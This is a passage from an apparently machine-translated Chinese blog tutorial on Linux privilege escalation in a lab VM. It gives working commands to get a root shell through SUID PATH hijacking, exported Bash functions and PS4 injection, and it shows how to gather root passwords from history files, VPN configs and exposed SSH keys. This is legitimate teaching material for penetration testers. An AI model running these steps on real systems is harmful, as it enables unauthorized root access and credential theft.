<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ strace -v -f -e execve /usr/local/bin/suid-env 2&gt;&amp;1 | grep service</span><br><span class="line">[pid  4721] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;service apache2 start&quot;], [&quot;TERM=xterm-256color&quot;, &quot;SHELL=/bin/bash&quot;, &quot;HISTSIZE=1000000&quot;, &quot;SSH_CLIENT=192.168.175.130 41318&quot;..., &quot;SSH_TTY=/dev/pts/1&quot;, &quot;HISTFILESIZE=1000000&quot;, &quot;USER=user&quot;, &quot;LS_COLORS=rs=0:di=01;34:ln=01;36&quot;..., &quot;MAIL=/var/mail/user&quot;, &quot;PATH=/usr/local/bin:/usr/bin:/bi&quot;..., &quot;PWD=/home/user&quot;, &quot;LANG=en_US.UTF-8&quot;, &quot;SHLVL=1&quot;, &quot;HOME=/home/user&quot;, &quot;LOGNAME=user&quot;, &quot;SSH_CONNECTION=192.168.175.130 4&quot;..., &quot;_=/usr/bin/strace&quot;, &quot;OLDPWD=/usr/local/bin&quot;]) = 0</span><br><span class="line">[pid  4721] execve(&quot;/usr/sbin/service&quot;, [&quot;service&quot;, &quot;apache2&quot;, &quot;start&quot;], [&quot;SHELL=/bin/bash&quot;, &quot;TERM=xterm-256color&quot;, &quot;HISTSIZE=1000000&quot;, &quot;SSH_CLIENT=192.168.175.130 41318&quot;..., &quot;SSH_TTY=/dev/pts/1&quot;, &quot;USER=user&quot;, &quot;HISTFILESIZE=1000000&quot;, &quot;LS_COLORS=rs=0:di=01;34:ln=01;36&quot;..., &quot;PATH=/usr/local/bin:/usr/bin:/bi&quot;..., &quot;MAIL=/var/mail/user&quot;, &quot;_=/usr/sbin/service&quot;, &quot;PWD=/home/user&quot;, &quot;LANG=en_US.UTF-8&quot;, &quot;HOME=/home/user&quot;, &quot;SHLVL=2&quot;, &quot;LOGNAME=user&quot;, &quot;SSH_CONNECTION=192.168.175.130 4&quot;...]) = 0</span><br><span class="line">[pid  4722] execve(&quot;/usr/bin/basename&quot;, [&quot;basename&quot;, &quot;/usr/sbin/service&quot;], [&quot;TERM=xterm-256color&quot;, &quot;SHELL=/bin/bash&quot;, &quot;HISTSIZE=1000000&quot;, &quot;SSH_CLIENT=192.168.175.130 41318&quot;..., &quot;SSH_TTY=/dev/pts/1&quot;, &quot;HISTFILESIZE=1000000&quot;, &quot;USER=user&quot;, &quot;LS_COLORS=rs=0:di=01;34:ln=01;36&quot;..., &quot;MAIL=/var/mail/user&quot;, &quot;PATH=/usr/local/bin:/usr/bin:/bi&quot;..., &quot;_=/usr/bin/basename&quot;, &quot;PWD=/home/user&quot;, &quot;LANG=en_US.UTF-8&quot;, &quot;SHLVL=3&quot;, &quot;HOME=/home/user&quot;, &quot;LOGNAME=user&quot;, &quot;SSH_CONNECTION=192.168.175.130 4&quot;...]) = 0</span><br><span class="line">[pid  4723] execve(&quot;/usr/bin/basename&quot;, [&quot;basename&quot;, &quot;/usr/sbin/service&quot;], [&quot;TERM=xterm-256color&quot;, &quot;SHELL/bin/bash&quot;, &quot;HISTSIZE=1000000&quot;, &quot;SSH_CLIENT=192.168.175.130 41318&quot;..., &quot;SSH_TTY=/dev/pts/1&quot;, &quot;HISTFILESIZE=1000000&quot;, &quot;USER=user&quot;, &quot;LS_COLORS=rs=0:di=01;34:ln=01;36&quot;..., &quot;MAIL=/var/mail/user&quot;, &quot;PATH=/usr/local/bin:/usr/bin:/bi&quot;..., &quot;PWD=/home/user&quot;, &quot;LANG=en_US.UTF-8&quot;, &quot;SHLVL=3&quot;, &quot;HOME=/home/user&quot;, &quot;LOGNAME=user&quot;, &quot;SSH_CONNECTION=192.168.175.130 4&quot;..., &quot;_=/usr/bin/basename&quot;]) = 0</span><br><span class="line">user@debian:~$ </span><br></pre></td></tr></table></div></figure>





<p>可选地，我们也可以用Itrace验证：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ltrace /usr/local/bin/suid-env 2&gt;&amp;1 | grep service</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701172644492.png" alt="image-20210701172644492"></p>
<p>这表明 系统 功能正用于执行 服务 计划。</p>

        <h4 id="4-创建-service-c具有-以下-内容："   >
          <a href="#4-创建-service-c具有-以下-内容：" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-创建-service-c具有-以下-内容：" class="headerlink" title="4.创建 service.c具有 以下 内容："></a>4.创建 service.c具有 以下 内容：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int main() </span><br><span class="line">&#123; </span><br><span class="line">setuid(0); </span><br><span class="line">system(&quot;/bin/bash -p&quot;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701172832305.png" alt="image-20210701172832305"></p>

        <h4 id="5-编译service-c文件："   >
          <a href="#5-编译service-c文件：" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-编译service-c文件：" class="headerlink" title="5.编译service.c文件："></a>5.编译service.c文件：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o service service.c</span><br></pre></td></tr></table></div></figure>


        <h4 id="6-将当前目录（或可执行新服务的位置）预编到PATH-变量，并执行用于根壳的-SUID-文件："   >
          <a href="#6-将当前目录（或可执行新服务的位置）预编到PATH-变量，并执行用于根壳的-SUID-文件：" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-将当前目录（或可执行新服务的位置）预编到PATH-变量，并执行用于根壳的-SUID-文件：" class="headerlink" title="6.将当前目录（或可执行新服务的位置）预编到PATH 变量，并执行用于根壳的 SUID 文件："></a>6.将当前目录（或可执行新服务的位置）预编到PATH 变量，并执行用于根壳的 SUID 文件：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PATH=.:$PATH /usr/local/bin/suid-env</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701172915956.png" alt="image-20210701172915956"></p>

        <h2 id="滥用外壳功能"   >
          <a href="#滥用外壳功能" class="heading-link"><i class="fas fa-link"></i></a><a href="#滥用外壳功能" class="headerlink" title="滥用外壳功能"></a>滥用外壳功能</h2>
      
        <h3 id="前言-15"   >
          <a href="#前言-15" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-15" class="headerlink" title="前言"></a>前言</h3>
      <p>在某些外壳中(特别是 Bash &lt;4.2-048)，可以使用绝对路径名称定义用户功能。<br>这些功能是可以导出，用来方便子处理程序能够访问它们，并且这些函数可以优先于实际可执行的呼叫。</p>

        <h3 id="实操-14"   >
          <a href="#实操-14" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-14" class="headerlink" title="实操"></a>实操</h3>
      
        <h4 id="1-在目标上查找SUID-SGID-文件-：-1"   >
          <a href="#1-在目标上查找SUID-SGID-文件-：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-在目标上查找SUID-SGID-文件-：-1" class="headerlink" title="1.在目标上查找SUID/SGID  文件 ："></a>1.在目标上查找SUID/SGID  文件 ：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l &#123;&#125; \; 2&gt; /dev/null </span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701173043064.png" alt="image-20210701173043064"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2</span><br></pre></td></tr></table></div></figure>

<p><code>suid-env</code>文件在root权限下执行</p>

        <h4 id="2-在SUID文件上运行字符串："   >
          <a href="#2-在SUID文件上运行字符串：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-在SUID文件上运行字符串：" class="headerlink" title="2.在SUID文件上运行字符串："></a>2.在SUID文件上运行字符串：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /usr/local/bin/suid-env2 </span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701173211516.png" alt="image-20210701173211516"></p>
<p>该文件可能正在尝试运行 /usr/sbin/service</p>

        <h4 id="3-我们可以用strace-策略-来验证这一点："   >
          <a href="#3-我们可以用strace-策略-来验证这一点：" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-我们可以用strace-策略-来验证这一点：" class="headerlink" title="3.我们可以用strace(策略)来验证这一点："></a>3.我们可以用strace(策略)来验证这一点：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -v -f -e execve /usr/local/bin/suid-env2 2&gt;&amp;1 | grep service</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701173504658.png" alt="image-20210701173504658"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ strace -v -f -e execve /usr/local/bin/suid-env2 2&gt;&amp;1 | grep service</span><br><span class="line">[pid  4892] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/service apache2 start&quot;], [&quot;TERM=xterm-256color&quot;, &quot;SHELL=/bin/bash&quot;, &quot;HISTSIZE=1000000&quot;, &quot;SSH_CLIENT=192.168.175.130 41318&quot;..., &quot;OLDPWD=/usr/local/bin&quot;, &quot;SSH_TTY=/dev/pts/1&quot;, &quot;HISTFILESIZE=1000000&quot;, &quot;USER=user&quot;, &quot;LS_COLORS=rs=0:di=01;34:ln=01;36&quot;..., &quot;MAIL=/var/mail/user&quot;, &quot;PATH=/usr/local/bin:/usr/bin:/bi&quot;..., &quot;PWD=/home/user&quot;, &quot;LANG=en_US.UTF-8&quot;, &quot;SHLVL=1&quot;, &quot;HOME=/home/user&quot;, &quot;LOGNAME=user&quot;, &quot;SSH_CONNECTION=192.168.175.130 4&quot;..., &quot;_=/usr/bin/strace&quot;]) = 0</span><br><span class="line">[pid  4892] execve(&quot;/usr/sbin/service&quot;, [&quot;/usr/sbin/service&quot;, &quot;apache2&quot;, &quot;start&quot;], [&quot;SHELL=/bin/bash&quot;, &quot;TERM=xterm-256color&quot;, &quot;HISTSIZE=1000000&quot;, &quot;SSH_CLIENT=192.168.175.130 41318&quot;..., &quot;SSH_TTY=/dev/pts/1&quot;, &quot;USER=user&quot;, &quot;HISTFILESIZE=1000000&quot;, &quot;LS_COLORS=rs=0:di=01;34:ln=01;36&quot;..., &quot;PATH=/usr/local/bin:/usr/bin:/bi&quot;..., &quot;MAIL=/var/mail/user&quot;, &quot;_=/usr/sbin/service&quot;, &quot;PWD=/home/user&quot;, &quot;LANG=en_US.UTF-8&quot;, &quot;HOME=/home/user&quot;, &quot;SHLVL=2&quot;, &quot;LOGNAME=user&quot;, &quot;SSH_CONNECTION=192.168.175.130 4&quot;...]) = 0</span><br><span class="line">[pid  4893] execve(&quot;/usr/bin/basename&quot;, [&quot;basename&quot;, &quot;/usr/sbin/service&quot;], [&quot;TERM=xterm-256color&quot;, &quot;SHELL=/bin/bash&quot;, &quot;HISTSIZE=1000000&quot;, &quot;SSH_CLIENT=192.168.175.130 41318&quot;..., &quot;SSH_TTY=/dev/pts/1&quot;, &quot;HISTFILESIZE=1000000&quot;, &quot;USER=user&quot;, &quot;LS_COLORS=rs=0:di=01;34:ln=01;36&quot;..., &quot;MAIL=/var/mail/user&quot;, &quot;PATH=/usr/local/bin:/usr/bin:/bi&quot;..., &quot;_=/usr/bin/basename&quot;, &quot;PWD=/home/user&quot;, &quot;LANG=en_US.UTF-8&quot;, &quot;SHLVL=3&quot;, &quot;HOME=/home/user&quot;, &quot;LOGNAME=user&quot;, &quot;SSH_CONNECTION=192.168.175.130 4&quot;...]) = 0</span><br><span class="line">[pid  4894] execve(&quot;/usr/bin/basename&quot;, [&quot;basename&quot;, &quot;/usr/sbin/service&quot;], [&quot;TERM=xterm-256color&quot;, &quot;SHELL=/bin/bash&quot;, &quot;HISTSIZE=1000000&quot;, &quot;SSH_CLIaENT=192.168.175.130 41318&quot;..., &quot;SSH_TTY=/dev/pts/1&quot;, &quot;HISTFILESIZE=1000000&quot;, &quot;USER=user&quot;, &quot;LS_COLORS=rs=0:di=01;34:ln=01;36&quot;..., &quot;MAIL=/var/mail/user&quot;, &quot;PATH=/usr/local/bin:/usr/bin:/bi&quot;..., &quot;PWD=/home/user&quot;, &quot;LANG=en_US.UTF-8&quot;, &quot;SHLVL=3&quot;, &quot;HOME=/home/user&quot;, &quot;LOGNAME=user&quot;, &quot;SSH_CONNECTION=192.168.175.130 4&quot;..., &quot;_=/usr/bin/basename&quot;]) = 0a</span><br></pre></td></tr></table></div></figure>




        <h4 id="4-可选地，我们也可以用跟踪验证："   >
          <a href="#4-可选地，我们也可以用跟踪验证：" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-可选地，我们也可以用跟踪验证：" class="headerlink" title="4.可选地，我们也可以用跟踪验证："></a>4.可选地，我们也可以用跟踪验证：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ltrace /usr/local/bin/suid-env2 2&gt;&amp;1 | grep service </span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701173542883.png" alt="image-20210701173542883"></p>
<p>这表明system功能正在用于执行<code>/usr/sbin/service</code>计划</p>

        <h4 id="5-验证-Bash-版本低于-4-2-048："   >
          <a href="#5-验证-Bash-版本低于-4-2-048：" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-验证-Bash-版本低于-4-2-048：" class="headerlink" title="5.验证    Bash 版本低于 4.2-048："></a>5.验证    Bash 版本低于 4.2-048：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash --version </span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701173609992.png" alt="image-20210701173609992"></p>

        <h4 id="6-创建-具有”-usr-sbin-service”名称的-Bash-功能-并导出-该功能："   >
          <a href="#6-创建-具有”-usr-sbin-service”名称的-Bash-功能-并导出-该功能：" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-创建-具有”-usr-sbin-service”名称的-Bash-功能-并导出-该功能：" class="headerlink" title="6.创建 具有”/usr/sbin/service”名称的 Bash 功能 并导出 该功能："></a>6.创建 具有”/usr/sbin/service”名称的 Bash 功能 并导出 该功能：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function /usr/sbin/service &#123; /bin/bash -p; &#125;</span><br><span class="line">export –f /usr/sbin/service </span><br></pre></td></tr></table></div></figure>




        <h4 id="7-执行用于根壳的-SUID-文件："   >
          <a href="#7-执行用于根壳的-SUID-文件：" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-执行用于根壳的-SUID-文件：" class="headerlink" title="7.执行用于根壳的 SUID 文件："></a>7.执行用于根壳的 SUID 文件：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/suid-env2 </span><br><span class="line">root@debian:~# id </span><br><span class="line">uid=0(root) gid=0(root) groups=0(root) </span><br></pre></td></tr></table></div></figure>


        <h2 id="二、滥用外壳功能"   >
          <a href="#二、滥用外壳功能" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、滥用外壳功能" class="headerlink" title="二、滥用外壳功能"></a>二、滥用外壳功能</h2>
      
        <h3 id="前言-16"   >
          <a href="#前言-16" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-16" class="headerlink" title="前言"></a>前言</h3>
      <p>Bash具有调试模式，可启用<code>–x</code>命令行选项，或通过修改 SHELLOPTS 环境变量以包括 xtrace启用。<br>默认情况下，SHELLOPTS是只读的，但是env命令允许</p>
<p>外壳选择待设置<br>在调试模式下，Bash 使用环境变量 PS4 显示调试语句的额外提示。此变量可以包括嵌入式命令，该命令每次显示时都会执行。</p>
<p>三、总线外壳功能</p>
<p>如果 SUID 文件通过 Bash 运行其他程序（例如使用system）， 这些环境变量可以继承。<br>如果执行 SUID 文件，此命令将使用文件所有者的权限执行。<br>在 Bash 版本 4.4 及以上中，PS4 环境变量不会由作为root运行的外壳继承。</p>

        <h3 id="实操-15"   >
          <a href="#实操-15" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-15" class="headerlink" title="实操"></a>实操</h3>
      
        <h4 id="1-在目标上查找苏伊德-SGID-文件-："   >
          <a href="#1-在目标上查找苏伊德-SGID-文件-：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-在目标上查找苏伊德-SGID-文件-：" class="headerlink" title="1.在目标上查找苏伊德/SGID 文件 ："></a>1.在目标上查找苏伊德/SGID 文件 ：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l &#123;&#125; \; 2&gt; /dev/null </span><br><span class="line"></span><br><span class="line">-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2 </span><br></pre></td></tr></table></div></figure>

<p>这个<code>suid-env2</code> 文件在root用户权限下执行</p>

        <h4 id="2-在SUID文件上运行字符串：-1"   >
          <a href="#2-在SUID文件上运行字符串：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-在SUID文件上运行字符串：-1" class="headerlink" title="2.在SUID文件上运行字符串："></a>2.在SUID文件上运行字符串：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ strings /usr/local/bin/suid-env2 </span><br><span class="line"></span><br><span class="line">/usr/sbin/service apache2 start</span><br></pre></td></tr></table></div></figure>

<p>该文件可能正在尝试运行 <code>/usr/sbin/service</code>程序</p>

        <h4 id="3-我们可以用策略来验证这一点：-1"   >
          <a href="#3-我们可以用策略来验证这一点：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-我们可以用策略来验证这一点：-1" class="headerlink" title="3.我们可以用策略来验证这一点："></a>3.我们可以用策略来验证这一点：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ strace -v -f -e execve /usr/local/bin/suid-env2 2&gt;&amp;1 | grep service</span><br></pre></td></tr></table></div></figure>


        <h4 id="4-可选地，们也可以用Itrace验证："   >
          <a href="#4-可选地，们也可以用Itrace验证：" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-可选地，们也可以用Itrace验证：" class="headerlink" title="4.可选地，们也可以用Itrace验证："></a>4.可选地，们也可以用Itrace验证：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ltrace /usr/local/bin/suid-env 2&gt;&amp;1 | grep service</span><br></pre></td></tr></table></div></figure>

<p>这和上一步操作都是一样的 下面开始</p>

        <h4 id="5-运行支持bash调试的SUID文件，并分配给我们的有效载荷的PS4变量："   >
          <a href="#5-运行支持bash调试的SUID文件，并分配给我们的有效载荷的PS4变量：" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-运行支持bash调试的SUID文件，并分配给我们的有效载荷的PS4变量：" class="headerlink" title="5.运行支持bash调试的SUID文件，并分配给我们的有效载荷的PS4变量："></a>5.运行支持bash调试的SUID文件，并分配给我们的有效载荷的PS4变量：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env -i SHELLOPTS=xtrace PS4=&#x27;$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)&#x27; /usr/local/bin/suid-env2</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701173845361.png" alt="image-20210701173845361"></p>

        <h4 id="6-使用-p-命令行选项运行-tmp-rootbash文件以获取root："   >
          <a href="#6-使用-p-命令行选项运行-tmp-rootbash文件以获取root：" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-使用-p-命令行选项运行-tmp-rootbash文件以获取root：" class="headerlink" title="6.使用 -p 命令行选项运行 /tmp/rootbash文件以获取root："></a>6.使用 -p 命令行选项运行 /tmp/rootbash文件以获取root：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/rootbash -p</span><br></pre></td></tr></table></div></figure>

<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701173901466.png" alt="image-20210701173901466"></p>

        <h1 id="0x10-密码-amp-钥匙"   >
          <a href="#0x10-密码-amp-钥匙" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x10-密码-amp-钥匙" class="headerlink" title="0x10 密码 &amp;钥匙"></a>0x10 密码 &amp;钥匙</h1>
      
        <h2 id="前言-17"   >
          <a href="#前言-17" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-17" class="headerlink" title="前言"></a>前言</h2>
      
        <h3 id="密码"   >
          <a href="#密码" class="heading-link"><i class="fas fa-link"></i></a><a href="#密码" class="headerlink" title="密码"></a>密码</h3>
      <p>虽然这看起来可能很漫长，但弱密码存储和密码重复使用可能是升级权限的简单方法。</p>
<p>虽然root用户的帐户密码被隐藏起来，并安全地存储在<code>/etc/shadow</code>中</p>
<p>但其他密码（如用于服务的密码）可能会 以普通文本存储在配置文件中。</p>
<p>如果根用户将密码重新用于服务，则可能会找到该密码并用于切换到根用户。</p>

        <h3 id="历史文件"   >
          <a href="#历史文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#历史文件" class="headerlink" title="历史文件"></a>历史文件</h3>
      <p>历史文件记录用户在使用某些程序时发出的命令。<br>如果用户将密码键入命令的一部分，此密码可能会存储在历史记录文件中。<br>尝试使用发现ed 密码切换到根</p>

        <h2 id="实操-16"   >
          <a href="#实操-16" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-16" class="headerlink" title="实操"></a>实操</h2>
      
        <h3 id="1-查看用户-home目录中隐藏文件的内容，文件名以”历史记录”结尾："   >
          <a href="#1-查看用户-home目录中隐藏文件的内容，文件名以”历史记录”结尾：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-查看用户-home目录中隐藏文件的内容，文件名以”历史记录”结尾：" class="headerlink" title="1.查看用户/home目录中隐藏文件的内容，文件名以”历史记录”结尾："></a>1.查看用户/home目录中隐藏文件的内容，文件名以”历史记录”结尾：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.*history | less</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701180324981.png" alt="image-20210701180324981"></p>
<p>两次q退出来</p>
<p>似乎连接到MySQL服务器的用户 </p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line">password123</span><br></pre></td></tr></table></div></figure>




        <h3 id="2-su-登录"   >
          <a href="#2-su-登录" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-su-登录" class="headerlink" title="2.su 登录"></a>2.su 登录</h3>
      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701180528720.png" alt="image-20210701180528720"></p>

        <h2 id="配置文件"   >
          <a href="#配置文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2>
      
        <h3 id="前言-18"   >
          <a href="#前言-18" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-18" class="headerlink" title="前言"></a>前言</h3>
      <p>许多服务和程序使用配置（配置）文件来存储设置。<br>如果服务需要对某件内容进行身份验证，则可能会将凭据存储在配置文件中。<br>如果这些配置文件是可访问的，并且它们存储的密码被特权用户重复使用，我们也许能够使用它作为该用户登录。</p>

        <h3 id="实操-17"   >
          <a href="#实操-17" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-17" class="headerlink" title="实操"></a>实操</h3>
      
        <h4 id="1-列出用户家庭目录的内容："   >
          <a href="#1-列出用户家庭目录的内容：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-列出用户家庭目录的内容：" class="headerlink" title="1.列出用户家庭目录的内容："></a>1.列出用户家庭目录的内容：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701180706925.png" alt="image-20210701180706925"></p>

        <h4 id="2-查看myvpn-ovpn-配置文件的内容："   >
          <a href="#2-查看myvpn-ovpn-配置文件的内容：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-查看myvpn-ovpn-配置文件的内容：" class="headerlink" title="2.查看myvpn.ovpn 配置文件的内容："></a>2.查看myvpn.ovpn 配置文件的内容：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat myvpn.ovpn </span><br></pre></td></tr></table></div></figure>

<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701180741245.png" alt="image-20210701180741245"></p>
<p>发现OpenVPN验证用户的纯文本内容</p>

        <h4 id="3-查看文件内容："   >
          <a href="#3-查看文件内容：" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-查看文件内容：" class="headerlink" title="3.查看文件内容："></a>3.查看文件内容：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/openvpn/auth.txt </span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701180850281.png" alt="image-20210701180850281"></p>

        <h4 id="4-使用su-登录"   >
          <a href="#4-使用su-登录" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-使用su-登录" class="headerlink" title="4.使用su 登录"></a>4.使用su 登录</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701180920818.png" alt="image-20210701180920818"></p>

        <h2 id="SSH-密钥"   >
          <a href="#SSH-密钥" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSH-密钥" class="headerlink" title="SSH 密钥"></a>SSH 密钥</h2>
      
        <h3 id="前言-19"   >
          <a href="#前言-19" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-19" class="headerlink" title="前言"></a>前言</h3>
      <p>可以使用 SSH 密钥而不是密码来验证使用 SSH 的用户。<br>SSH密钥成对提供：一个私钥和一个公钥。私钥应始终保密。<br>如果用户不安全地存储了其私钥，则任何能够读取密钥的用户都可能能够使用它登录到他们的帐户。</p>

        <h3 id="实操-18"   >
          <a href="#实操-18" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-18" class="headerlink" title="实操"></a>实操</h3>
      
        <h4 id="1-root用户的ssh密钥存储在-ssh"   >
          <a href="#1-root用户的ssh密钥存储在-ssh" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-root用户的ssh密钥存储在-ssh" class="headerlink" title="1.root用户的ssh密钥存储在.ssh"></a>1.root用户的ssh密钥存储在<code>.ssh</code></h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /.ssh </span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701181023210.png" alt="image-20210701181023210"></p>
<p>并且文件root_key是可读的</p>

        <h4 id="2-查看root-key文件的内容："   >
